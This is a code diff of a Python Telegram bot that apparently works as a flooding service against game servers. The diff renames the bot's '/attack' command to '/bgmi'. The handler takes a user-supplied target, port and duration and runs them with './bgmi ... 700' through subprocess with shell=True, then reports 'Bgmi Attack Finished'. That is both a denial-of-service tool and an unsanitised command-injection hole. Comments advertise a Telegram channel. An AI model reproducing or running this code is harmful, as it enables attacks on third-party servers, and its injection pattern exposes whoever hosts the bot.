@@ -453,7 +453,7 @@ def show_user_id(message):
     bot.reply_to(message, response)
 
 # Function to handle the reply when free users run the /bgmi command
-def start_attack_reply(message, target, port, time):
+def start_bgmi_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
@@ -466,7 +466,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Join :- @Sivsiv11 # Handler for /bgmi command
-@bot.message_handler(commands=['attack'])
+@bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -490,7 +490,7 @@ def handle_bgmi(message):
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Join :- @Sivsiv11 # Call start_attack_reply function
+                start_bgmi_reply(message, target, port, time)  # Join :- @Sivsiv11 # Call start_bgmi_reply function
                 full_command = f"./bgmi {target} {port} {time} 700"
                 subprocess.run(full_command, shell=True)
                 response = f"💥 Bgmi Attack Finished Now ⚡"
